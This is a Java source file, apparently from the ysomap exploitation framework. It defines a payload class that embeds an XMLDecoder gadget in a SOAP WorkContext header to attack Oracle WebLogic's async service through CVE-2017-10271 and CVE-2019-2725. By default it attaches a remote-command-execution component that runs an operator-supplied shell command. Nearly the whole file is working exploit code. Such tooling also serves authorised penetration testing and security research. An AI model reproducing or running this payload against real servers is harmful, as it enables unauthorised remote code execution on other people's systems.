package ysomap.payloads.xmldecoder;

import ysomap.bullets.Bullet;
import ysomap.bullets.weblogic.xml.WeblogicXMLRCEBullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Payloads
@Targets({Targets.XMLDECODER})
@Authors({ Authors.WH1T3P1G })
@Require(bullets = {"WeblogicXMLJndiBullet","WeblogicXMLRCEBullet"}, param = false)
@Dependencies({"weblogic CVE-2017-10271 & CVE-2019-2725 for async"})
public class WeblogicXML2 extends XMLDecoderPayload<Object> {

    @Override
    public Object pack(Object obj) throws Exception {
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   \n" +
                "  <soapenv:Header> \n" +
                "    <wsa:Action>xx</wsa:Action>\n" +
                "    <wsa:RelatesTo>xx</wsa:RelatesTo>\n" +
                "    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" + obj +
                "\n\t</work:WorkContext>\n" +
                "  </soapenv:Header>   \n" +
                "  <soapenv:Body>      \n" +
                "    <asy:onAsyncDelivery/>   \n" +
                "  </soapenv:Body>\n" +
                "</soapenv:Envelope>";
        return payload;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        Bullet bullet = new WeblogicXMLRCEBullet();
        bullet.set("cmd", args[0]);
        return bullet;
    }
}
